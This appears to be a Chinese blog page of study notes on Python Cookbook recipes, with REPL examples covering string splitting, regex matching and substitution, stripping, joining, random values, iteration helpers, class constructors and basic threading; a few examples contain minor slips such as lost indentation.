<h2><span id="二-字符串和文本">二、字符串和文本</span></h2><h3><span id="使用多个界定符分割字符串">使用多个界定符分割字符串</span></h3><p><code>re.split()</code>方法， 可以更加灵活的切割字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">&#x27;asdf fjdk; afed, fjek,asdf, foo&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[;,\s]\s*&#x27;</span>, line)</span><br><span class="line">[<span class="string">&#x27;asdf&#x27;</span>, <span class="string">&#x27;fjdk&#x27;</span>, <span class="string">&#x27;afed&#x27;</span>, <span class="string">&#x27;fjek&#x27;</span>, <span class="string">&#x27;asdf&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3><span id="x20字符串开头或结尾匹配">&#x20;字符串开头或结尾匹配</span></h3><p>利用<code>startswith()</code>和<code>endswith()</code>方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>filename = <span class="string">&#x27;spam.txt&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>filename.endswith(<span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">url = <span class="string">&#x27;http://www.python.org&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url.startswith(<span class="string">&#x27;http:&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3><span id="用shell通配符匹配字符串">用Shell通配符匹配字符串</span></h3><p>Python中可以使用<code>fnmatch()</code>和<code>fnmatchcase()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fnmatch <span class="keyword">import</span> fnmatch, fnmatchcase</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">&#x27;foo.txt&#x27;</span>, <span class="string">&#x27;*.txt&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">&#x27;foo.txt&#x27;</span>, <span class="string">&#x27;?oo.txt&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">&#x27;Dat45.csv&#x27;</span>, <span class="string">&#x27;Dat[0-9]*&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3><span id="字符串搜索匹配">字符串搜索匹配</span></h3><p>在字符串中搜索字符串，并返回下标， 使用find()函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;yeah, but no, but yeah&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.find(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.find(<span class="string">&#x27;not&#x27;</span>)</span><br><span class="line">-<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>对于复杂匹配使用正则表达式和re模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text1 = <span class="string">&#x27;11/27/2012&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text2 = <span class="string">&#x27;Nov 27, 2012&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Simple matching: \d+ means match one or more digits</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+/\d+/\d+&#x27;</span>, text1):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">yes</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+/\d+/\d+&#x27;</span>, text2):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">no</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>注：如果使用同一个模式去多次匹配，应该将模式串预编译为模式对象，比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>datepat = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+/\d+/\d+&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> datepat.<span class="keyword">match</span>(text1):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">yes</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> datepat.<span class="keyword">match</span>(text2):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">no</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3><span id="字符串搜索和替换">字符串搜索和替换</span></h3><p>对于简单字符串替换，用str.replace()函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;yeah, but no, but yeah, but no, but yeah&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.replace(<span class="string">&#x27;yeah&#x27;</span>, <span class="string">&#x27;yep&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;yep, but no, but yep, but no, but yep&#x27;</span></span><br></pre></td></tr></table></figure>

<p>对于复杂的模式，用re模块的sub函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;Today is 11/27/2012. PyCon starts 3/13/2013.&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">r&#x27;(\d+)/(\d+)/(\d+)&#x27;</span>, <span class="string">r&#x27;\3-\1-\2&#x27;</span>, text)</span><br><span class="line"><span class="string">&#x27;Today is 2012-11-27. PyCon starts 2013-3-13.&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3><span id="x20字符串忽略大小写的搜索替换">&#x20;字符串忽略大小写的搜索替换</span></h3><p>使用re模块时添加re.IGNORECASE参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;UPPER PYTHON, lower python, Mixed Python&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(<span class="string">&#x27;python&#x27;</span>, text, flags=re.IGNORECASE)</span><br><span class="line">[<span class="string">&#x27;PYTHON&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;Python&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;snake&#x27;</span>, text, flags=re.IGNORECASE)</span><br><span class="line"><span class="string">&#x27;UPPER snake, lower snake, Mixed snake&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3><span id="删除字符串中不需要的字符">删除字符串中不需要的字符</span></h3><p>strip方法可以删除开头和结尾的空白字符</p>
<p>lstrip()和rstrip()分别从左和从右执行删除操作</p>
<p>除了默认的空白字符，也可以指定其他字符，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27; hello world \n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.strip()</span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.lstrip()</span><br><span class="line"><span class="string">&#x27;hello world \n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.rstrip()</span><br><span class="line"><span class="string">&#x27; hello world&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Character stripping</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = <span class="string">&#x27;-----hello=====&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.lstrip(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;hello=====&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.strip(<span class="string">&#x27;-=&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>如果要删除中间的空格，需要用其他技术， 比如replace方法或正则表达式替换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27; hello     world \n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;helloworld&#x27;</span></span><br></pre></td></tr></table></figure>

<h3><span id="字符串对齐">字符串对齐</span></h3><p>基本的字符串对齐操作，可以使用字符串的ljust(),rjust(),center()方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.ljust(<span class="number">20</span>)</span><br><span class="line"><span class="string">&#x27;Hello World         &#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.rjust(<span class="number">20</span>)</span><br><span class="line"><span class="string">&#x27;         Hello World&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.center(<span class="number">20</span>)</span><br><span class="line"><span class="string">&#x27;    Hello World     &#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.rjust(<span class="number">20</span>,<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;=========Hello World&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.center(<span class="number">20</span>,<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;****Hello World*****&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3><span id="合并字符串">合并字符串</span></h3><p>如果待合并的字符串在一个序列中， 最快的方法是使用join()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>parts = [<span class="string">&#x27;Is&#x27;</span>, <span class="string">&#x27;Chicago&#x27;</span>, <span class="string">&#x27;Not&#x27;</span>, <span class="string">&#x27;Chicago?&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27; &#x27;</span>.join(parts)</span><br><span class="line"><span class="string">&#x27;Is Chicago Not Chicago?&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;|&#x27;</span>.join(parts)</span><br><span class="line"><span class="string">&#x27;Is|Chicago|Not|Chicago?&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.join(parts)</span><br><span class="line"><span class="string">&#x27;IsChicagoNotChicago?&#x27;</span></span><br></pre></td></tr></table></figure>

<p>注意不必要的字符串连接操作，比如打印时</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(a + <span class="string">&#x27;:&#x27;</span> + b + <span class="string">&#x27;:&#x27;</span> + c) <span class="comment"># Ugly</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;:&#x27;</span>.join([a, b, c])) <span class="comment"># Still ugly</span></span><br><span class="line"><span class="built_in">print</span>(a, b, c, sep=<span class="string">&#x27;:&#x27;</span>) <span class="comment"># Better</span></span><br></pre></td></tr></table></figure>

<h3><span id="字符串中插入变量">字符串中插入变量</span></h3><p>使用format函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#123;name&#125; has &#123;n&#125; message.&#x27;</span>.<span class="built_in">format</span>(name=<span class="string">&#x27;peter&#x27;</span>, n=<span class="number">5</span>)</span><br><span class="line"><span class="string">&#x27;peter has 5 message.&#x27;</span></span><br></pre></td></tr></table></figure>

<h2><span id="三-数字日期和时间">三、数字日期和时间</span></h2><h3><span id="数字四舍五入">数字四舍五入</span></h3><p>简单的舍入运算，使用内置round(value, ndigits)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">1.23</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">1.2</span></span><br></pre></td></tr></table></figure>

<p>格式化输出，使用内置format函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">1234.56789</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">format</span>(x, <span class="string">&#x27;0.2f&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="二八十六进制整数">二八十六进制整数</span></h3><p>为了将整数转为二进制，八进制，十六进制文本串。分别使用bin, oct, hex函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">1234</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(x)</span><br><span class="line"><span class="string">&#x27;0b10011010010&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">oct</span>(x)</span><br><span class="line"><span class="string">&#x27;0o2322&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(x)</span><br><span class="line"><span class="string">&#x27;0x4d2&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">format</span>(x, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;10011010010&#x27;</span></span><br></pre></td></tr></table></figure>

<h3><span id="随机选择">随机选择</span></h3><p>使用random.choice()， 从一个序列中随机抽取一个元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>values = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.sample(values, <span class="number">3</span>)</span><br><span class="line">[<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<p>随机打乱元素顺序， 使用random.shuffle()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.shuffle(values)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>values</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>生成随机整数，用random.randint()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.randint(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>生成0-1的浮点数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.random()</span><br><span class="line"><span class="number">0.9406677561675867</span></span><br></pre></td></tr></table></figure>

<h2><span id="第四章-迭代器与生成器">第四章 迭代器与生成器</span></h2><h3><span id="不用for语句迭代">不用for语句迭代</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">it = <span class="built_in">iter</span>(L)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        item = <span class="built_in">next</span>(it)</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"><span class="keyword">except</span> StopIteration:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h3><span id="反向迭代">反向迭代</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">reversed</span>(a):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(x)</span><br><span class="line">...</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3><span id="序列上索引值迭代">序列上索引值迭代</span></h3><h3><span id="迭代同时跟踪被处理元素索引">迭代同时，跟踪被处理元素索引</span></h3><p>使用内置的<code>enumerate</code>函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_list = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(my_list):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(idx, val)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> a</span><br><span class="line"><span class="number">1</span> b</span><br><span class="line"><span class="number">2</span> c</span><br></pre></td></tr></table></figure>

<p>指定开始参数</p>
<pre><code>&gt;&gt;&gt; my_list = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]
&gt;&gt;&gt; for idx, val in enumerate(my_list, 1):
... print(idx, val)
...
1 a
2 b
3 c
</code></pre>
<h3><span id="同时迭代多个序列">同时迭代多个序列</span></h3><p>使用zip函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xpts = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">ypts = [<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(xpts,ypts):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;x=&#123;&#125;, y=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x, y))</span><br></pre></td></tr></table></figure>

<p>zip函数会创建一个迭代器作为结果返回，如果需要将结对值存到列表，使用list函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">zip</span>(a, b)</span><br><span class="line">&lt;<span class="built_in">zip</span> <span class="built_in">object</span> at <span class="number">0x1007001b8</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="built_in">zip</span>(a, b))</span><br><span class="line">[(<span class="number">1</span>, <span class="number">10</span>), (<span class="number">2</span>, <span class="number">11</span>), (<span class="number">3</span>, <span class="number">12</span>)]</span><br></pre></td></tr></table></figure>

<h2><span id="不同集合上元素迭代">不同集合上元素迭代</span></h2><p>场景：想在多个对象执行相同操作， 但对象在不同容器中，希望代码在不失可读性情况下避免写重复循环</p>
<p>使用itertools.chain()方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> chain(a, b):</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(x)</span><br><span class="line">...</span><br><span class="line">1234xyz</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h2><span id="x20顺序迭代合并后排序迭代对象">&#x20;顺序迭代合并后排序迭代对象</span></h2><p>使用heapq.merge()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> heapq</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> heapq.merge(a, b):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(c)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>heapq.merge</code> 可迭代特性意味着它不会立马读取所有序列。 这就意味着你可以在非常长的序列中使用它，而不会有太大的开销。</p>
<p><code>heapq.merge()</code> 需要所有输入序列必须是排过序的。</p>
<h2><span id="使用其他分隔符或行终止符打印">使用其他分隔符或行终止符打印</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ACME&#x27;</span>,<span class="number">50</span>,sep=<span class="string">&#x27;,&#x27;</span>,end=<span class="string">&#x27;!!\n&#x27;</span>)</span><br><span class="line">ACME,<span class="number">50</span>!!</span><br></pre></td></tr></table></figure>

<p>输出中禁止换行，用end参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">	<span class="built_in">print</span>(i, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> &gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h2><span id="函数">函数</span></h2><h3><span id="定义有默认参数的函数">定义有默认参数的函数</span></h3><p>默认参数的值仅仅在函数定义的时候赋值一次</p>
<p>默认参数的值应该是不可变的对象，比如None、True、False、数字或字符串</p>
<p>测试None值时使用 <code>is</code> 操作符是很重要的</p>
<h2><span id="八-类对象">八、类对象</span></h2><h3><span id="改变一个实例字符串表示可通过重新定义str和repr方法实现">改变一个实例字符串表示，可通过重新定义str和repr方法实现：</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">		<span class="variable language_">self</span>.x = x</span><br><span class="line">		<span class="variable language_">self</span>.y = y</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Pair(&#123;0.x!r&#125;, &#123;0.y!r&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3><span id="类中定义等多个构造器">类中定义等多个构造器</span></h3><p>想实现一个类，除了使用init方法，还有其他方法初始化它</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span>:</span><br><span class="line"><span class="string">&quot;&quot;&quot; 方法一：使用类方法&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># Primary constructor</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, year, month, day</span>):</span><br><span class="line"><span class="variable language_">self</span>.year = year</span><br><span class="line"><span class="variable language_">self</span>.month = month</span><br><span class="line"><span class="variable language_">self</span>.day = day</span><br><span class="line"><span class="comment"># Alternate constructor</span></span><br><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">today</span>(<span class="params">cls</span>):</span><br><span class="line">t = time.localtime()</span><br><span class="line"><span class="keyword">return</span> cls(t.tm_year, t.tm_mon, t.tm_mday)</span><br><span class="line"></span><br><span class="line">a = Date(<span class="number">2012</span>, <span class="number">12</span>, <span class="number">21</span>) <span class="comment"># Primary</span></span><br><span class="line">b = Date.today() <span class="comment"># Alternate</span></span><br></pre></td></tr></table></figure>

<p>通过字符串调用对象方法</p>
<p>使用attr方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="variable language_">self</span>.x = x</span><br><span class="line">        <span class="variable language_">self</span>.y = y</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Point(&#123;!r:&#125;,&#123;!r:&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">distance</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="keyword">return</span> math.hypot(<span class="variable language_">self</span>.x - x, <span class="variable language_">self</span>.y - y)</span><br><span class="line">p = Point(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">d = <span class="built_in">getattr</span>(p, <span class="string">&#x27;distance&#x27;</span>)(<span class="number">0</span>, <span class="number">0</span>) <span class="comment"># Calls p.distance(0, 0)</span></span><br></pre></td></tr></table></figure>

<p>另一种方法是使用operator.methodcaller()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> operator</span><br><span class="line">operator.methodcaller(<span class="string">&#x27;distance&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>)(p)</span><br></pre></td></tr></table></figure>

<h2><span id="第十一章-网络与web编程">第十一章 网络与web编程</span></h2><p>HTTP请求 urllib.request</p>
<p>创建TCP服务器 socketserver (单线程)</p>
<h2><span id="第十二章-并发编程">第十二章 并发编程</span></h2><h3><span id="threading库创建线程">threading库创建线程</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">countdown</span>(<span class="params">n</span>):</span><br><span class="line">	<span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;T-minus&#x27;</span>, n)</span><br><span class="line">		n -= <span class="number">1</span></span><br><span class="line">		time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create and launch a thread</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">t = Thread(target=countdown, args=(<span class="number">10</span>,))</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure>
<h3><span id="线程间通信">线程间通信</span></h3><ul>
<li>使用Queue对象，Queue对象已包含必要锁，可以用它在多个线程间安全共享数据</li>
</ul>
